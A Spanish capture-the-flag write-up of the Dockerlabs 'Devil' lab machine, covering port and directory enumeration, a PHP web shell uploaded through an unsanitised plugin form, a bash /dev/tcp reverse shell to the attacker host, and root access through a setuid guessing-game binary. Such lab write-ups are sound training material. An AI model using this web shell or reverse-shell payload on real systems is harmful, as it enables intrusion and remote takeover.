
# Writeup Template: Maquina `[ Devil ]`

- Tags: #Devil
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Devil](https://mega.nz/file/vAFHDCTB#LbMKq1zL8hVWUJ8Of0sSZ3Qvke-Px9sj4MLJx7MHIkw)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x devil.zip
sudo bash auto_deploy.sh devil.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
80/tcp open  http    Apache httpd 2.4.58 ((UbuntuNoble))
```
---

## Enumeracion de [Servicio Web Principal] `CMS Drupal`
Tenemos **hostsDiscovery** asi que agregamos la siguiente linea a nuestro archivo: **/etc/passwd**
```bash
172.17.0.2 devil.lab
```

direccion **URL** del servicio:
```bash
http://devil.lab/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://devil.lab/

MetaGenerator[Drupal 10 (https://www.drupal.org)], Script[importmap,module], Title[Hackstry]
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 devil.lab
```

Reporte:
```bash
/wp-includes/images/rss.png: Wordpress version 2.2 found.
/wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
/wp-includes/images/blank.gif: Wordpress version 2.6 found.
/wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
/wp-admin/upgrade.php: Wordpress login page.
/: Drupal version 10 
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://devil.lab/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
/wp-content/          (Status: 200) [Size: 0]
/wp-includes/         (Status: 200) [Size: 58939]
/wp-admin/            (Status: 302) [Size: 0] [--> http://devil.lab]
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://devil.lab/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt,html,js,java,py
```

- **Hallazgos**:
```bash
/index.php            (Status: 301) [Size: 0] [--> http://devil.lab/]
/wp-content           (Status: 301) [Size: 311] [--> http://devil.lab/wp-content/]
/wp-login.php         (Status: 302) [Size: 0] [--> http://devil.lab]
/license.txt          (Status: 200) [Size: 19915]
/wp-includes          (Status: 301) [Size: 312] [--> http://devil.lab/wp-includes/]
/functions.php        (Status: 200) [Size: 42]
/wp-trackback.php     (Status: 302) [Size: 0] [--> http://devil.lab]
/wp-admin             (Status: 301) [Size: 309] [--> http://devil.lab/wp-admin/]
/xmlrpc.php           (Status: 302) [Size: 0] [--> http://devil.lab]
Progress: 230170 / 12738330 (1.81%)/wp-content/          (Status: 200) [Size: 0]
/wp-includes/         (Status: 200) [Size: 58939]
/wp-admin/            (Status: 302) [Size: 0] [--> http://devil.lab]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://devil.lab]
```

Ahora fuzzeamos en profundidad:
```bash
feroxbuster -u http://devil.lab/wp-content/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 50 -d 10 -x php,php.back,backup,txt,sh,html,js,java,py
```

Tenemos los siguientes directorios:
```bash
10271/s http://devil.lab/wp-content/ 
10247/s http://devil.lab/wp-content/themes/ 
20972626/s http://devil.lab/wp-content/uploads/ => Directory listing (add --scan-dir-listings to scan)
346048333/s http://devil.lab/wp-content/uploads/esteestudirectorio/ => Directory listing (add --scan-dir-listings to scan)
415258000/s http://devil.lab/wp-content/uploads/2024/ => Directory listing (add --scan-dir-listings to scan)
346048333/s http://devil.lab/wp-content/uploads/2024/09/ => Directory listing (add --scan-dir-listings to scan)
10208/s http://devil.lab/wp-content/plugins/ 
296612857/s http://devil.lab/wp-content/upgrade/ => Directory listing (add --scan-dir-listings to scan)
10271/s http://devil.lab/wp-content/plugins/backdoor/ 
519072500/s http://devil.lab/wp-content/plugins/backdoor/uploads/ => Directory listing (add --scan-dir-listings to scan)
11311/s http://devil.lab/wp-content/plugins/akismet/ 
43256042/s http://devil.lab/wp-content/plugins/akismet/views/ => Directory listing (add --scan-dir-listings to scan)
57674722/s http://devil.lab/wp-content/plugins/akismet/_inc/ => Directory listing (add --scan-dir-listings to scan)
188753636/s http://devil.lab/wp-content/plugins/akismet/_inc/rtl/ => Directory listing (add --scan-dir-listings to scan)
4127813/s http://devil.lab/wp-content/plugins/akismet/_inc/img/ => Directory listing (add --scan-dir-listings to scan)
115349444/s http://devil.lab/wp-content/plugins/akismet/_inc/fonts/ => Directory listing (add --scan-dir-listings to scan)
```

Tenemos este directorio:
```bash
http://devil.lab/wp-content/uploads/esteestudirectorio/
```

Que en su interior contiene un archivo: **aqui.txt**
```bash
http://devil.lab/wp-content/uploads/esteestudirectorio/aqui.txt
```

Tiene este contenido:
```bash
-- . .--- --- .-.
.--. .-. ..- . -... .-
.... .-
.... .- -.-. . .-.
..-. ..- --.. .. -. --.
.--. . .-. ---
-. ---
. -.
. ... - .
-.. .. .-. . -.-. - --- .-. .. ---
.--. .-. ..- . -... .-
-.-. --- -.
..- -.
-.. .. .-. . -.-. - --- .-. .. ---
.- - .-. .- ... .-.-.-
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora en esta ruta parece que se cargan los archvios que suban en el servidor:
```bash
http://devil.lab/wp-content/plugins/backdoor/uploads/
```

Tambien tenemos esta ruta donde podemos cargar archvios, Si no esta sanitizado nos aprovecharemos para subir un archivo maliciosos que nos permita realizar una llamada a nivel de sistema para ejecutar un comando:
```bash
http://devil.lab/wp-content/plugins/backdoor/
```

Nos permite subir un **CV** en **pfd** o **word** pero subiremos un archivo **php**
**cmd.php**
```php
<?php
  system($_GET["cmd"]);
?>
```

### Ejecucion del Ataque
Una ves subido recargamos la carpeta de **uploads** y cargamos nuestro archivo:
```bash
http://devil.lab/wp-content/plugins/backdoor/uploads/cmd.php
```

Ahora ejecutamos de manera exitosa comandos en la maquina victima:
```bash
# Comandos para explotación
http://devil.lab/wp-content/plugins/backdoor/uploads/cmd.php?cmd=whoami
```

### Intrusion
Modo escucha
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
http://devil.lab/wp-content/plugins/backdoor/uploads/cmd.php?cmd=bash -c 'exec bash -i %26>/dev/tcp/172.17.0.1/443 <%261'
```

---

## Escalada de Privilegios

###### Usuario `[ www-data ]`:
Vemos que podemos atravesar el directorio del usuario **andy**
```bash
/home/andy
```

Listando sus archivos tenemos lo siguiente:
```bash
-rwxr-xr-x 1 root root   13 Sep 11  2024 .pista.txt
-rwxr-xr-x 1 andy andy  807 Mar 31  2024 .profile
drwxr-xr-x 2 andy andy 4096 Sep 11  2024 .secret
-rwxr-xr-x 1 andy andy  867 Sep 11  2024 .viminfo
drwxr-xr-x 2 root root 4096 Sep 11  2024 aquilatienes
```

Listamos el contenido del archivo: **.pist.txt**
```bash
cat .pista.txt 
cm90ODAwMAo=
```

En nuestra maquina descriframos:
```bash
echo -n "cm90ODAwMAo=" | base64 -d
rot8000
```

Aqui tenemos este directorio:
```bash
/home/andy/aquilatienes
```

Tenemos un archivo **password.txt** que revisamos su contenido:
```bash
ç±ªç±·ç±­ç²ç±ç±µç±ªç±µç±¸ç±¬ç±ªç°º
```

Despueste tenemos un archivo **ftp** que si lo ejecutamos nos migra al usuario:**lucas**
```bash
./ftpserver
```

###### Usuario `[ Lucas ]`:
Una ves como este usuario listamos los archivos de su directorio personal:
**bonus.txt**
```bash
Casi lo  logras! Pero antes deberas jugar, encuentra el juego en tu directorio personal.
```

Tenemos este binario que ejecuta una shell como root:
```bash
EligeOMuere
```

```c
at game.c 
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    int guess;
    int secret_number = 7; // Número secreto para ganar

    printf("¡Bienvenido al juego de adivinanzas!\n");
    printf("Adivina el número secreto (entre 1 y 10): ");
    scanf("%d", &guess);

    if (guess == secret_number) {
        printf("¡Felicidades! Has adivinado el número.\n");
        printf("Iniciando shell como root...\n");

        // Cambia el UID efectivo a root (0)
        setuid(0);
        system("/bin/bash");
    } else {
        printf("Número incorrecto. Intenta de nuevo.\n");
    }

    return 0;
}
```

Ahora sabiendo que necesitamos el numero **7** lo usaremos para migrar a root
```bash
# Comando para escalar al usuario: ( root )
¡Bienvenido al juego de adivinanzas!
Adivina el número secreto (entre 1 y 10): 7
¡Felicidades! Has adivinado el número.
Iniciando shell como root...
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@9ddd1e2698fa:/home/lucas/.game# whoami
root
```

---